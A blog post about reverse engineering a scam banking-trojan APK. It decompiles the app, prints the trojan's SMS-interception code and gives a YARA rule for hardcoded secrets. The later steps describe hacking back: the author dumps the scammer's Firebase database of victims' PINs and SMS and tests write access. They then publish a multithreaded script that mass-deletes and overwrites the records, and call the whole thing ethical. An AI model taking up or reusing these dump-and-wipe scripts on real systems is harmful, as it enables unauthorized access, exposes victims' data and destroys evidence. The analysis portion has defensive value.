# How I Turned the Tables on a Scammer by Reverse Engineering Their Banking Trojan App

## Introduction

Recently, I received a suspicious APK file from someone attempting to scam me. They claimed to be from a state bank. Instead of falling victim, I decided to investigate the app and see exactly what it was trying to do. What I found was shocking - not only was the app collecting sensitive user data, but the developer had left their database completely exposed. Here's how I discovered the vulnerability and turned the tables on the scammer.

> **Note:** All the content is easy and simple, so non-Geek people can understand. Don't worry!

![bank](https://i.ibb.co/v47Z5qLx/bank.jpg)



## Step 1: Unpacking the APK

An APK (Android Package Kit) is essentially a zip file with a different extension. My first step was to unzip it to examine its contents using apktool:

```bash
apktool d scam.apk 
```

![apktool](https://i.ibb.co/x85f00V6/apkt.png)

After unpacking, I found the standard APK structure including the `classes.dex` files (containing compiled code) and `resources.arsc` (containing the app's resources).

![unzip](https://i.ibb.co/8nTJmJ67/Screenshot-from-2025-04-02-19-26-32.png)


### APK Structure Deep Dive

The unpacked APK revealed a typical Android app structure:

- **classes.dex files** - These contain the compiled bytecode that the Android runtime executes
- **res/** directory - Contains all app resources such as layouts, strings, and images
- **AndroidManifest.xml** - Defines the app's structure, components, and permissions
- **assets/** - Contains additional resources used by the app
- **resources.arsc file** - compiled resource file that stores precompiled Android resources like strings, colors, dimensions, and localized content.


Looking at the AndroidManifest.xml, I noticed the app requested extensive permissions including:

- READ_SMS
- READ_CONTACTS  
- READ_PHONE_STATE
- RECEIVE_SMS
- INTERNET

These permissions alone should raise red flags, as a legitimate banking app would not need access to read all SMS messages or contacts.

## Step 2: Decompiling with JADX

The next step was to convert the DEX files back into readable Java source code. For this, I used JADX, a popular DEX to Java decompiler.

Instead of manually running JADX on each file, I created a bash script to recursively process all the files:

```bash
#!/bin/bash
APK_FOLDER="scam"
find "$APK_FOLDER" \( -iname "*.dex" -o -iname "*.arsc" \) -type f -print0 | while IFS= read -r -d '' file; do
    output_dir="${file}_jadx"
    echo "Decompiling file: $file"
    mkdir -p "$output_dir"
    jadx -d "$output_dir" "$file"
done
```

Output:
```
arn@arxhr007:~/Desktop/scam$ bash decompile.sh 
Decompiling file: scam/classes2.dex
INFO  - loading ...
INFO  - processing ...
INFO  - done                                                 
Decompiling file: scam/classes.dex
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 3                       
Decompiling file: scam/classes3.dex
INFO  - loading ...
INFO  - processing ...
INFO  - done                                                 
Decompiling file: scam/resources.arsc
INFO  - loading ...
INFO  - processing ...
INFO  - done 
```

This gave me access to the app's source code which I thought might be obfuscated, but luckily it wasn't. Now I could analyze it for suspicious activity.

### Key Code Findings

Examining the decompiled code, I found several concerning components like this and much more:

```java
// SMS collection and forwarding mechanism
    public void onReceive(Context ctx, Intent data) {
        Bundle bundle;
        Object[] pduArray;
        Log.d("SMSListener", "SMS Received");
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(data.getAction()) || (bundle = data.getExtras()) == null || (pduArray = (Object[]) bundle.get("pdus")) == null) {
            return;
        }
        for (Object pdu : pduArray) {
            SmsMessage sms = Build.VERSION.SDK_INT >= 23 ? SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format")) : SmsMessage.createFromPdu((byte[]) pdu);
            String text = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();
            String deviceId = new DeviceInfoService(ctx).getId();
            TelephonyManager telManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String networkInfo = telManager != null ? "Provider: " + telManager.getNetworkOperatorName() + ", SIM: " + telManager.getLine1Number() : "Unknown";
            if (sender != null && !text.isEmpty()) {
                processSMS(ctx, sender, text, networkInfo);
                logSMS(ctx, sender, text, networkInfo, deviceId);
            }
        }
    }

```

This code was intercepting all incoming SMS messages and uploading them to Firebase. While legitimate banking apps might need to read OTP messages, they would never upload the full content of all SMS messages to an external server.

## Step 3: Writing a YARA Rule to Find API Keys

Looking through thousands of lines of code manually would be tedious, so I created a YARA rule specifically designed to find API keys and sensitive credentials.

### What is YARA?

YARA is a pattern matching tool designed to help malware researchers identify and classify malware. It's often described as "the Swiss Army knife of pattern matching" and allows you to create rules (based on textual or binary patterns) to search for specific strings or patterns in files. YARA rules are widely used in cybersecurity for:

- Malware detection and classification
- Threat hunting
- Digital forensics
- Incident response
- Reverse engineering

YARA rules consist of three main components: meta information, strings definitions, and conditions. The strings section defines patterns to search for, while the conditions section defines the logic for when a rule should match.

Here's the YARA rule I created:

```bash
rule APK_Analysis
{
    meta:
        author = "arxhr007"
        description = "Detects backend technologies, API keys, and sensitive info in an APK"
    strings:
        $api_key_google      = /AIza[0-9A-Za-z-_]{35}/
        $api_key_firebase    = /AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}/
        $api_key_aws         = /AKIA[0-9A-Z]{16}/
        $api_key_other       = /\b[0-9a-f]{32}\b/
        $api_key_stripe      = /sk_live_[0-9a-zA-Z]{24}/
        $api_key_slack       = /xox[baprs]-[0-9A-Za-z]{10,48}/
        $api_key_github      = /ghp_[0-9A-Za-z]{36}/
        $api_key_mailgun     = /key-[0-9a-zA-Z]{32}/
        $api_key_twilio_sid  = /AC[0-9A-Za-z]{32}/
        $firebase_url            = /https:\/\/[^"'\s]+\.firebaseio\.com/
        $graphql                 = /graphql/i
        $php_backend             = /\.php["']/
        $node_backend            = /express|koa|sails/i
        $django_backend          = /django|rest_framework/i
        $laravel_backend         = /laravel|Illuminate/i
        $jwt                     = /eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/
        $sql_creds               = /(jdbc:mysql:\/\/|postgres:\/\/|mongodb:\/\/)[^"'\s]+/
        $firebase_service_account= /"type":\s*"service_account".{1,500}"private_key":\s*"-----BEGIN PRIVATE KEY-----/s
        $hardcoded_passwords     = /(password\s*=\s*"[^"]+"|password:\s*"[^"]+")/i
    condition:
        any of (
            $api_key_google,
            $api_key_firebase,
            $api_key_aws,
            $api_key_other,
            $api_key_stripe,
            $api_key_slack,
            $api_key_github,
            $api_key_mailgun,
            $api_key_twilio_sid
        ) or any of (
            $firebase_url,
            $graphql,
            $php_backend,
            $node_backend,
            $django_backend,
            $laravel_backend,
            $jwt,
            $sql_creds,
            $firebase_service_account,
            $hardcoded_passwords
        )
}
```

I ran the rule against the decompiled sources (the entire folder):

```bash
yara -w -r -s apk_yara.yar scam
```

Output:

![YARA results](https://i.ibb.co/nMXzwVvq/finalreal.jpg)

## Step 4: Jackpot - Finding the Firebase Database

The scan revealed something critical: the app was using Firebase Realtime Database with an exposed API key. Even more concerning, the database had no proper security rules in place.

The URL structure looked something like:
```
https://xcpbank-app-rtdb.firebaseio.com/
```
> Note : For this blog I used fake firebase realtime database url of Scammer for Ethical reasons !
## Step 5: Investigating the Database

Using Python and the Firebase REST API, I wrote a script to check what data was being stored:

```python
import requests
import json

database_url = 'https://xcpbank-app-rtdb.firebaseio.com'  
response = requests.get(f'{database_url}.json')  
if response.status_code == 200:
    data = response.json()  
    with open('data.json', 'w') as json_file:
        json.dump(data, json_file, indent=4)  
    print("Data saved successfully.")
```

Output data.json:

![Database data](https://i.ibb.co/V078y31N/data.jpg)

To my horror, I found the database contained information from over 100,000 victims, including:
- Full names
- Phone numbers
- MPINs 
- SMS messages
- Device information
- And much more personal data


This data would give scammers everything they need to perform financial fraud, identity theft, and social engineering attacks.

## Step 6: Testing Write Access

I needed to confirm if the database had proper write restrictions:

```python
import requests
import json

firebase_url = "https://xcpbank-app-rtdb.firebaseio.com/test.json"
test_data = {"message": "Testing write access"}

response = requests.put(firebase_url, json=test_data)
print(response.status_code)
print(response.text)
```

Output:

![Write access test](https://i.ibb.co/9mGcKQrB/write.png)

The result was alarming - I had full read AND write access to the entire database. This represented a serious security vulnerability that put thousands of people's data at risk.

## Step 7: Ethical Countermeasure - The Scammer-Spammer Script

To protect the victims and neutralize the scammer's operation without causing harm, I decided to replace the stolen data with generated fake data. In the JSON file, there was a node called "sms" which contained sensitive information. I wrote a Python script called [scammer-spammer.py](https://pastebin.com/raw/RyBuLTNk) to handle this task.

### Understanding the scammer-spammer.py Script

Here's a breakdown of how the script works:

```python
import requests
import json
import re
from faker import Faker
import time
from concurrent.futures import ThreadPoolExecutor

database_url = 'https://xxx-rtdb.firebaseio.com'
fake = Faker()

def sanitize_firebase_key(key):
    return re.sub(r'[\.\$\#\[\]\/]', '_', key)

def generate_fake_data():
    return {
        "device_id": fake.uuid4(),
        "model": f"{fake.first_name()}'s {fake.random_element(['A54', 'M21', 'F19', 'X10'])}",
        "number": f"SIM 1: Operator - {fake.random_element(['jio', 'airtel', 'vodafone'])}, Number - {fake.phone_number()}",
        "time": fake.date_time_this_year().strftime("%m-%d-%Y | %H:%M")
    }

def insert_data(data, path="users"):
    try:
        url = f"{database_url}/{path}.json"
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print(f"Data successfully inserted: {data}")
            return response.json()
        else:
            print(f"Error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

def delete_data(node_id, path="users"):
    try:
        node_id = sanitize_firebase_key(node_id) 
        url = f"{database_url}/{path}/{node_id}.json"
        response = requests.delete(url)
        if response.status_code == 200:
            print(f"Node with ID '{node_id}' successfully deleted.")
        else:
            print(f"Error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"An error occurred: {e}")

def get_node_ids_from_json(file_path="data.json"):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            if isinstance(data, list):
                return data
            else:
                print("JSON data is not in the expected format (list of node IDs).")
                return []
    except Exception as e:
        print(f"An error occurred while reading the JSON file: {e}")
        return []

def remove_node_id_from_json(node_id, file_path="data.json"):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        if node_id in data:
            data.remove(node_id)
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)
        print(f"Node ID '{node_id}' removed from the JSON file.")
    except Exception as e:
        print(f"An error occurred while updating the JSON file: {e}")

def insert_fake_data_multithreaded(num_entries, max_threads=5, json_file_path="data.json"):
    node_ids = get_node_ids_from_json(json_file_path)
    if not node_ids:
        print("Replaced all users")
        return

    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for _ in range(num_entries):
            fake_data = generate_fake_data()
            futures.append(executor.submit(insert_data, fake_data, "users"))
            
            if node_ids:
                node_id_to_delete = sanitize_firebase_key(node_ids.pop(0))
                futures.append(executor.submit(delete_data, node_id_to_delete))
                futures.append(executor.submit(remove_node_id_from_json, node_id_to_delete, json_file_path))
                
            if not node_ids:
                print("Replaced all users")
                break
                
        for future in futures:
            try:
                result = future.result()
                print(f"Insertion, Deletion or Removal result: {result}")
            except Exception as e:
                print(f"Error in thread execution: {e}")

if __name__ == "__main__":
    num_entries = 10000
    max_threads = 10
    json_file_path = "data.json"
    
    start_time = time.time()
    insert_fake_data_multithreaded(num_entries, max_threads, json_file_path)
    end_time = time.time()
    
    print(f"Completed insertion of {num_entries} entries, deletion of users, and removal from JSON in {end_time - start_time:.2f} seconds")
```

#### Script Breakdown:

1. **Data Generation**: The `generate_fake_data()` function creates realistic but completely fake device information using the Faker library.

2. **Firebase Interactions**: Functions like `insert_data()` and `delete_data()` handle the communication with the Firebase database, allowing me to replace real data with fake data.

5. **Multi-threading**: To speed up the process, the script uses ThreadPoolExecutor to run multiple operations concurrently. This is crucial when dealing with a large database of over 100,000 entries.

4. **Tracking Progress**: The script keeps track of processed IDs in a local JSON file to ensure all data is replaced and to resume if interrupted.

![Script in action](https://i.ibb.co/3mQzJGcY/real-work.png)



## Conclusion
Finally, I replaced the entire scammers database with fake data.😌

This experience highlights several important lessons:

1. **Always be cautious with APK files from unknown sources**
2. **Proper security configuration is critical for cloud databases**
3. **API keys should never be hardcoded in mobile applications**
4. **Firebase and similar services require careful security rule setup**
5. **Multithreaded approaches can be effective for dealing with large-scale data cleanup**
6. **Even amateur researchers can make a significant impact on security**



Remember: reverse engineering should only be done ethically and legally, and finding vulnerabilities comes with the responsibility to disclose them properly.

Stay safe online!